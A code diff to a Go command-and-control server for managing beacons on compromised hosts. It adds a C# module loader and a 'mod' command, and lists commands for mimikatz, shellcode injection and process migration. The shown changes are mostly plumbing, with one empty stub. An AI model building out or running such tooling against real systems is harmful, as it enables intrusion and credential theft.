@@ -47,6 +47,7 @@ const idBytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
 var idLen int = 8
 var listeners []*HttpListener = make([]*HttpListener, 0)
 var beacons []*Beacon = make([]*Beacon, 0)
+var csharpModules []*CSharpModule = make([]*CSharpModule, 0)
 var activeBeacon *Beacon
 var activeBeaconInteractive = false
 var cmdArgs = map[string]string {
@@ -58,22 +59,14 @@ var cmdArgs = map[string]string {
     "create": "<listener> <target> <target arch>",
 	"download": "<beacon id OR index> <remote file> OR <remote file>...",
 	"upload": "<beacon id OR index> <local file> OR <local file>...",
-	"mimikatz": "<arguments>...",
 	"use": "<beacon id OR index>",
 	"script": "<beacon id OR index> <local file path> <remote executor path>",
 	// beacon commands
+	"mimikatz": "<arguments>...",
 	"shellcode": "<path to shellcode> <PID>",
 	"migrate": "<PID>",
 	"plist": "",
 }
-
-/*
-
-
-potentially turn into automated network pwn tool?
-
-
-*/
 
 func getIfaceIp(iface string) (string) {
 	ief, _ := net.InterfaceByName(iface)
@@ -132,6 +125,10 @@ func genRandID() string {
     }
     
 	return string(b)
+}
+
+func execModuleOnBeacon(cmd[] string) {
+
 }
 
 func execOnBeacon(cmd []string) {
@@ -350,6 +347,20 @@ func notifyBeaconOfProxyUpdate(proxy *Beacon, targetId string) {
 	proxy.ProxyClientBuffer = append(proxy.ProxyClientBuffer, string(data))
 }
 
+func updateModule(name string, language string, source string) {
+	for _, module := range csharpModules {
+		if module.Name == name {
+			module.Source = source
+			module.writeToDisk()
+			return
+		}
+	}
+	
+	newMod := newCSharpModule(name, source)
+	newMod.writeToDisk()
+	csharpModules = append(csharpModules, newMod)
+}
+
 func processInput(input string) {
 	cmd := strings.Fields(input);
 	
@@ -413,6 +424,12 @@ func processInput(input string) {
 				migrateBeacon(cmd)
 			case "help":
 				printHelp(cmd)
+			case "mod":
+				if activeBeacon != nil {
+					execModuleOnBeacon(cmd)
+				} else {
+					info("Interact with a beacon first (use).")
+				}
 			case "plist":
 				if activeBeacon != nil {
 					execOnBeacon(append(cmd, "plist"))
@@ -479,6 +496,30 @@ func readLine() string {
 	return <-terminalPipe
 }
 
+func loadModules() {
+    files, err := ioutil.ReadDir("modules")
+
+    if err != nil {
+		return
+	}
+ 
+    for _, f := range files {
+        nameSplit := strings.Split(f.Name(), ".")
+		name := nameSplit[0]
+		fileType := nameSplit[1]
+
+		source, err := ioutil.ReadFile("modules/" + f.Name())
+
+		if err != nil {
+			continue
+		}
+
+		if fileType == "cs" {
+			csharpModules = append(csharpModules, newCSharpModule(name, string(source)))
+		}
+    }
+}
+
 func main() {
 	var WebInterface = WebInterface {
 		port: 8000,
@@ -511,21 +552,10 @@ func main() {
 		info("Failed to start http server.")
 	}
 
-	mod := CSharpModule { 
-		source: `
-			namespace Module {
-				using System;
-				class ModEntry {
-					static void Main(string[] args) {
-						Console.WriteLine("Hello Shellcode!");
-					}
-				}
-			}
-		`,
-	}
-	mod.compile()
 
 	//listeners = append(listeners, &HttpListenerTun0)
 	listeners = append(listeners, &HttpListenerLocalhost)
+
+	loadModules()
 	handleInput()
 }
